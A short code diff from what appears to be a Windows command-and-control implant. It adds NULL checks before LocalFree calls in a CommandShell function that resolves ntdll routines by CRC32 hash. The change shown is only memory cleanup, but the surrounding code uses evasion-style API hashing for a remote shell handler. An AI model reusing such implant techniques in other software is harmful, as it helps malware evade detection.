@@ -258,11 +258,29 @@ VOID CommandShell( PPARSER Parser ){
         p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
     }
 
-    LocalFree(*(PVOID *)wide_command);
-    LocalFree(*(PVOID *)wide_args);
-    LocalFree(*(PVOID *)command_array);
-    LocalFree(*(PVOID *)cmd_file);
-    LocalFree(*(PVOID *)command_line);
+    if (*(PVOID *)wide_command != NULL) {
+        LocalFree(*(PVOID *)wide_command);
+    }
+
+    if (*(PVOID *)wide_args != NULL) {
+        LocalFree(*(PVOID *)wide_args);
+    }
+
+    if (*(PVOID *)command_array != NULL) {
+        LocalFree(*(PVOID *)command_array);
+    }
+
+    if (*(PVOID *)cmd_file != NULL) {
+        LocalFree(*(PVOID *)cmd_file);
+    }
+
+    if (*(PVOID *)command_line != NULL) {
+        LocalFree(*(PVOID *)command_line);
+    }
+
+    if (*(PVOID *)command_w_space != NULL) {
+        LocalFree(*(PVOID *)command_w_space);
+    }
 
     RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlDestroyProcessParameters_CRC32B);
     p_RtlDestroyProcessParameters(proc_params);
